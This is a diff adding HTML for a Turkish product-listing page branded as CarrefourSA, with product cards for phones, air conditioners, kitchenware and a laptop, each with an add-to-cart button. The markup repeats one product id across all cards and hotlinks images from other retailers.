+           <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+           <span class="facet-label">
+            <a href="/?filtre=Carrefour">
+             <span class="facet-mark">
+             </span>
+            </a>
+            <span>
+             <a class="brand-capitalize-name" hidden="true" href="javascript:void(0);" rel="nofollow">
+              Carrefour
+             </a>
+             <a href="/?filtre=Carrefour">
+              <span id="name">
+               Carrefour
+              </span>
+             </a>
+            </span>
+           </span>
+          </label>
+         </li>
+         <li>
+          <label>
+           <input class="facet-checkbox js-facet-checkbox sr-only" disabled="" type="checkbox"/>
+           <span class="facet-label">
+            <a href="/?filtre=ALTUS">
+             <span class="facet-mark">
+             </span>
+            </a>
+            <span>
+             <a class="brand-capitalize-name" hidden="true" href="javascript:void(0);" rel="nofollow">
+              ALTUS
+             </a>
+             <a href="/?filtre=ALTUS">
+              <span id="name">
+               ALTUS
+              </span>
+             </a>
+            </span>
+           </span>
+          </label>
+         </li>
+        </ul>
+       </div>
+      </div>
+     </div>
+     <div class="col-xs-12 col-md-10 col-lg-10">
+      <div class="csa-seg-qa-container">
+      </div>
+      <div class="seg-container-for-category-one">
+      </div>
+      <div class="seg-container-for-category-two">
+      </div>
+      <div class="yCmsComponent slide">
+      </div>
+      <div class="yCmsComponent slide">
+      </div>
+      <div class="ct-all-pl">
+       <div class="ap-facets-filters clearfix hidden-xs hidden-sm">
+        <div class="row">
+         <div class="col-xs-6 col-sm-6 col-md-6 col-lg-6 link-filters">
+          <ul class="list-inline">
+          </ul>
+          <form action="#" id="sortForm2" method="get" name="sortForm2">
+           <select class="form-control cat-sorting-option" name="sortingOption">
+            <option selected="selected" value="bestSeller">
+             Çok Satanlar
+            </option>
+            <option value="price-desc">
+             En Yüksek Fiyat
+            </option>
+            <option value="relevance">
+             Akıllı Sıralama
+            </option>
+            <option value="price-asc">
+             En Düşük Fiyat
+            </option>
+           </select>
+          </form>
+         </div>
+        </div>
+       </div>
+       <div class="pl-grid-cont">
+        <ul class="product-listing product-grid container-fluid add_to_cart" data-currentpagenumber="0" data-maxpagenumber="33" data-pagination-url="/telefon/c/2305?q=%3AbestSeller">
+         <li class="product-listing-item">
+          <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+           <div class="pl-inner">
+            <div class="hover-box">
+             <div class="product_click" id="30429427">
+              <a class="product-return" href="/urun?id=22">
+               <span class="thumb">
+                <img alt="Stanley 10-08265-001 Klasik Vakumlu 1.4 Litre Çelik Termos - Yeşil" data-loadedx="false" data-src="https://cdn.karaca.com/rcman/cw695h695q90gm/image/cdndata/128/202209/153.03.08.3996/6939236347587-1.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://cdn.karaca.com/rcman/cw695h695q90gm/image/cdndata/128/202209/153.03.08.3996/6939236347587-1.jpg" width="140px"/>
+               </span>
+               <h3 class="item-name" content="30429427">
+                Stanley 10-08265-001 Klasik Vakumlu 1.4 Litre Çelik Termos - Yeşil
+               </h3>
+               <span class="item-info">
+               </span>
+               <span class="dis-price-cont">
+                <span class="discount-badge">
+                 CarrefourSA Özel
+                </span>
+               </span>
+               <span class="price-cont" content="TRY" itemprop="priceCurrency">
+                <div class="item-price-contain">
+                 <span class="hidden" content="InStock" itemprop="availability">
+                  InStock
+                 </span>
+                </div>
+               </span>
+               <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+                1.779,00 TL
+               </span>
+              </a>
+             </div>
+             <p class="item-price-unit">
+             </p>
+            </div>
+            <div class="clearfix qty-mc">
+             <div class="addToCartFavoriteProducts">
+              <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle22" onclick="SepeteEkle(22)" type="button">
+               <span class="add-to-cart-icon">
+               </span>
+               Sepete Ekle
+              </button>
+              <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor22" onclick="SepeteEkle(22)" style="display: none" type="button">
+               <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+               </span>
+               Ürün Ekleniyor...
+              </button>
+             </div>
+            </div>
+            <div class="add-slist-cont">
+            </div>
+           </div>
+           <span class="added-to-cart-info" id="sepeteeklendibildirim22" style="display: none; top: 100px; opacity: 1;">
+            Sepetinize Eklendi
+           </span>
+          </div>
+         </li>
+        </ul>
+       </div>
+       <li class="product-listing-item">
+        <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+         <div class="pl-inner">
+          <div class="hover-box">
+           <div class="product_click" id="30429427">
+            <a class="product-return" href="/urun?id=23">
+             <span class="thumb">
+              <img alt="Philips BRI921/00 Lumea Advanced IPL Lazer Epilasyon Aleti" data-loadedx="false" data-src="https://reimg-carrefour.mncdn.com/mnresize/600/600/productimage/30238761/30238761_0_MC/8818081628210_1586514198720.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://reimg-carrefour.mncdn.com/mnresize/600/600/productimage/30238761/30238761_0_MC/8818081628210_1586514198720.jpg" width="140px"/>
+             </span>
+             <h3 class="item-name" content="30429427">
+              Philips BRI921/00 Lumea Advanced IPL Lazer Epilasyon Aleti
+             </h3>
+             <span class="item-info">
+             </span>
+             <span class="dis-price-cont">
+              <span class="discount-badge">
+               CarrefourSA Özel
+              </span>
+             </span>
+             <span class="price-cont" content="TRY" itemprop="priceCurrency">
+              <div class="item-price-contain">
+               <span class="hidden" content="InStock" itemprop="availability">
+                InStock
+               </span>
+              </div>
+             </span>
+             <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+              12.579,00 TL
+             </span>
+            </a>
+           </div>
+           <p class="item-price-unit">
+           </p>
+          </div>
+          <div class="clearfix qty-mc">
+           <div class="addToCartFavoriteProducts">
+            <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle23" onclick="SepeteEkle(23)" type="button">
+             <span class="add-to-cart-icon">
+             </span>
+             Sepete Ekle
+            </button>
+            <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor23" onclick="SepeteEkle(23)" style="display: none" type="button">
+             <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+             </span>
+             Ürün Ekleniyor...
+            </button>
+           </div>
+          </div>
+          <div class="add-slist-cont">
+          </div>
+         </div>
+         <span class="added-to-cart-info" id="sepeteeklendibildirim23" style="display: none; top: 100px; opacity: 1;">
+          Sepetinize Eklendi
+         </span>
+        </div>
+       </li>
+      </div>
+      <li class="product-listing-item">
+       <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+        <div class="pl-inner">
+         <div class="hover-box">
+          <div class="product_click" id="30429427">
+           <a class="product-return" href="/urun?id=24">
+            <span class="thumb">
+             <img alt="Fissler Vitaquick Premium 6 3,5 Lt Düdüklü Tencere Seti Cam Kapak" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/547/375-375/110000607317496.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/547/375-375/110000607317496.jpg" width="140px"/>
+            </span>
+            <h3 class="item-name" content="30429427">
+             Fissler Vitaquick Premium 6 3,5 Lt Düdüklü Tencere Seti Cam Kapak
+            </h3>
+            <span class="item-info">
+            </span>
+            <span class="dis-price-cont">
+             <span class="discount-badge">
+              CarrefourSA Özel
+             </span>
+            </span>
+            <span class="price-cont" content="TRY" itemprop="priceCurrency">
+             <div class="item-price-contain">
+              <span class="hidden" content="InStock" itemprop="availability">
+               InStock
+              </span>
+             </div>
+            </span>
+            <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+             14.499,00 TL
+            </span>
+           </a>
+          </div>
+          <p class="item-price-unit">
+          </p>
+         </div>
+         <div class="clearfix qty-mc">
+          <div class="addToCartFavoriteProducts">
+           <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle24" onclick="SepeteEkle(24)" type="button">
+            <span class="add-to-cart-icon">
+            </span>
+            Sepete Ekle
+           </button>
+           <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor24" onclick="SepeteEkle(24)" style="display: none" type="button">
+            <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+            </span>
+            Ürün Ekleniyor...
+           </button>
+          </div>
+         </div>
+         <div class="add-slist-cont">
+         </div>
+        </div>
+        <span class="added-to-cart-info" id="sepeteeklendibildirim24" style="display: none; top: 100px; opacity: 1;">
+         Sepetinize Eklendi
+        </span>
+       </div>
+      </li>
+     </div>
+     <li class="product-listing-item">
+      <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+       <div class="pl-inner">
+        <div class="hover-box">
+         <div class="product_click" id="30429427">
+          <a class="product-return" href="/urun?id=25">
+           <span class="thumb">
+            <img alt="Beko Ekolojik 31825 A++ 18000 BTU Inverter Duvar Tipi Klima" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/42/375/10721143521330.jpg/format:webp" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/42/375/10721143521330.jpg/format:webp" width="140px"/>
+           </span>
+           <h3 class="item-name" content="30429427">
+            Beko Ekolojik 31825 A++ 18000 BTU Inverter Duvar Tipi Klima
+           </h3>
+           <span class="item-info">
+           </span>
+           <span class="dis-price-cont">
+            <span class="discount-badge">
+             CarrefourSA Özel
+            </span>
+           </span>
+           <span class="price-cont" content="TRY" itemprop="priceCurrency">
+            <div class="item-price-contain">
+             <span class="hidden" content="InStock" itemprop="availability">
+              InStock
+             </span>
+            </div>
+           </span>
+           <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+            37.809,00 TL
+           </span>
+          </a>
+         </div>
+         <p class="item-price-unit">
+         </p>
+        </div>
+        <div class="clearfix qty-mc">
+         <div class="addToCartFavoriteProducts">
+          <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle25" onclick="SepeteEkle(25)" type="button">
+           <span class="add-to-cart-icon">
+           </span>
+           Sepete Ekle
+          </button>
+          <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor25" onclick="SepeteEkle(25)" style="display: none" type="button">
+           <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+           </span>
+           Ürün Ekleniyor...
+          </button>
+         </div>
+        </div>
+        <div class="add-slist-cont">
+        </div>
+       </div>
+       <span class="added-to-cart-info" id="sepeteeklendibildirim25" style="display: none; top: 100px; opacity: 1;">
+        Sepetinize Eklendi
+       </span>
+      </div>
+     </li>
+    </div>
+    <li class="product-listing-item">
+     <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+      <div class="pl-inner">
+       <div class="hover-box">
+        <div class="product_click" id="30429427">
+         <a class="product-return" href="/urun?id=26">
+          <span class="thumb">
+           <img alt="Samsung Ar35 Silver Ar12txhqası/sk A++ 12000 Btu Inverter Duvar Tipi Klima" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/37/375-375/10574063370290.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/37/375-375/10574063370290.jpg" width="140px"/>
+          </span>
+          <h3 class="item-name" content="30429427">
+           Samsung Ar35 Silver Ar12txhqası/sk A++ 12000 Btu Inverter Duvar Tipi Klima
+          </h3>
+          <span class="item-info">
+          </span>
+          <span class="dis-price-cont">
+           <span class="discount-badge">
+            CarrefourSA Özel
+           </span>
+          </span>
+          <span class="price-cont" content="TRY" itemprop="priceCurrency">
+           <div class="item-price-contain">
+            <span class="hidden" content="InStock" itemprop="availability">
+             InStock
+            </span>
+           </div>
+          </span>
+          <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+           26.899,00 TL
+          </span>
+         </a>
+        </div>
+        <p class="item-price-unit">
+        </p>
+       </div>
+       <div class="clearfix qty-mc">
+        <div class="addToCartFavoriteProducts">
+         <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle26" onclick="SepeteEkle(26)" type="button">
+          <span class="add-to-cart-icon">
+          </span>
+          Sepete Ekle
+         </button>
+         <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor26" onclick="SepeteEkle(26)" style="display: none" type="button">
+          <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+          </span>
+          Ürün Ekleniyor...
+         </button>
+        </div>
+       </div>
+       <div class="add-slist-cont">
+       </div>
+      </div>
+      <span class="added-to-cart-info" id="sepeteeklendibildirim26" style="display: none; top: 100px; opacity: 1;">
+       Sepetinize Eklendi
+      </span>
+     </div>
+    </li>
+   </div>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=27">
+         <span class="thumb">
+          <img alt="Bosch Climate CL2000U W 35 E 12000 BTU Split Klima Beyaz" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/470/375-375/110000511392877.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/470/375-375/110000511392877.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Bosch Climate CL2000U W 35 E 12000 BTU Split Klima Beyaz
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          25.099,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle27" onclick="SepeteEkle(27)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor27" onclick="SepeteEkle(27)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim27" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=28">
+         <span class="thumb">
+          <img alt="Samsung Galaxy A34 5g 128 Gb 8 Gb Ram Yeşil" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/381/550/110000400008524.jpg/format:webp" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/381/550/110000400008524.jpg/format:webp" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Samsung Galaxy A34 5g 128 Gb 8 Gb Ram Yeşil
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          17.750,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle28" onclick="SepeteEkle(28)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor28" onclick="SepeteEkle(28)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim28" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=29">
+         <span class="thumb">
+          <img alt="Dreame D9 Robot Süpürge Vacuum Mop Cleaner" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/451/375-375/110000485708795.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/451/375-375/110000485708795.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Dreame D9 Robot Süpürge Vacuum Mop Cleaner
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          10.499,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle29" onclick="SepeteEkle(29)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor29" onclick="SepeteEkle(29)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim29" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=30">
+         <span class="thumb">
+          <img alt="Apple iPhone 11 128 GB Beyaz Cep Telefonu Aksesuarsız Kutu (Apple Türkiye Garantili)" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/490/375-375/110000537558211.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/490/375-375/110000537558211.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Apple iPhone 11 128 GB Beyaz Cep Telefonu Aksesuarsız Kutu (Apple Türkiye Garantili)
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          29.999,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle30" onclick="SepeteEkle(30)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor30" onclick="SepeteEkle(30)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim30" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=31">
+         <span class="thumb">
+          <img alt="Xiaomi Redmi Note 12S 256 GB 8 GB RAM Siyah Cep Telefonu (Xiaomi Türkiye Garantili)" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/777/375-375/110000629852548.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/777/375-375/110000629852548.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Xiaomi Redmi Note 12S 256 GB 8 GB RAM Siyah Cep Telefonu (Xiaomi Türkiye Garantili)
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          12.899,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle31" onclick="SepeteEkle(31)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor31" onclick="SepeteEkle(31)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim31" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=32">
+         <span class="thumb">
+          <img alt="LENOVO Ideapad Gaming 3 AMD Ryzen 5 16 GB 512GB SSD RTX2050- 4GB Freedos 15.6" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/543/375-375/110000602823222.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/543/375-375/110000602823222.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          LENOVO Ideapad Gaming 3 AMD Ryzen 5 16 GB 512GB SSD RTX2050- 4GB Freedos 15.6
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          22.499,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle32" onclick="SepeteEkle(32)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor32" onclick="SepeteEkle(32)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim32" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=33">
+         <span class="thumb">
+          <img alt="Xiaomi Redmi Note 11 Pro 128 GB 8 GB RAM Akıllı Telefon Gri TR Garantili" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/296/375-375/110000286509149.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/296/375-375/110000286509149.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Xiaomi Redmi Note 11 Pro 128 GB 8 GB RAM Akıllı Telefon Gri TR Garantili
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          9.699,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle33" onclick="SepeteEkle(33)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor33" onclick="SepeteEkle(33)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim33" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=34">
+         <span class="thumb">
+          <img alt="Xiaomi 13 Lite 256 GB 8 GB RAM Siyah Cep Telefonu (Xiaomi Türkiye Garantili)" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/374/375-375/110000391929101.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/374/375-375/110000391929101.jpg" width="140px"/>
+         </span>
+         <h3 class="item-name" content="30429427">
+          Xiaomi 13 Lite 256 GB 8 GB RAM Siyah Cep Telefonu (Xiaomi Türkiye Garantili)
+         </h3>
+         <span class="item-info">
+         </span>
+         <span class="dis-price-cont">
+          <span class="discount-badge">
+           CarrefourSA Özel
+          </span>
+         </span>
+         <span class="price-cont" content="TRY" itemprop="priceCurrency">
+          <div class="item-price-contain">
+           <span class="hidden" content="InStock" itemprop="availability">
+            InStock
+           </span>
+          </div>
+         </span>
+         <span class="item-price js-variant-discounted-price" content="349.0" itemprop="price">
+          20.499,00 TL
+         </span>
+        </a>
+       </div>
+       <p class="item-price-unit">
+       </p>
+      </div>
+      <div class="clearfix qty-mc">
+       <div class="addToCartFavoriteProducts">
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="sepetekle34" onclick="SepeteEkle(34)" type="button">
+         <span class="add-to-cart-icon">
+         </span>
+         Sepete Ekle
+        </button>
+        <button class="btn btn-default btn-block js-add-to-cart js-add-to-cart-product-item addToCartButton" id="urunekleniyor34" onclick="SepeteEkle(34)" style="display: none" type="button">
+         <span class="fa fa-spinner fa-spin glyphicon glyphicon-repeat">
+         </span>
+         Ürün Ekleniyor...
+        </button>
+       </div>
+      </div>
+      <div class="add-slist-cont">
+      </div>
+     </div>
+     <span class="added-to-cart-info" id="sepeteeklendibildirim34" style="display: none; top: 100px; opacity: 1;">
+      Sepetinize Eklendi
+     </span>
+    </div>
+   </li>
+   <li class="product-listing-item">
+    <div class="item product-card addtocart-component favoriteProductsItem col-xs-12 has-badge">
+     <div class="pl-inner">
+      <div class="hover-box">
+       <div class="product_click" id="30429427">
+        <a class="product-return" href="/urun?id=35">
+         <span class="thumb">
+          <img alt="Apple Watch Series 7 45mm GPS Yıldız Işığı Akıllı Saat (Apple Türkiye Garantili)" data-loadedx="false" data-src="https://productimages.hepsiburada.net/s/126/375-375/110000076885268.jpg" decoding="async" height="140px" itemprop="image" loading="lazy" src="https://productimages.hepsiburada.net/s/126/375-375/110000076885268.jpg" width="140px"/>
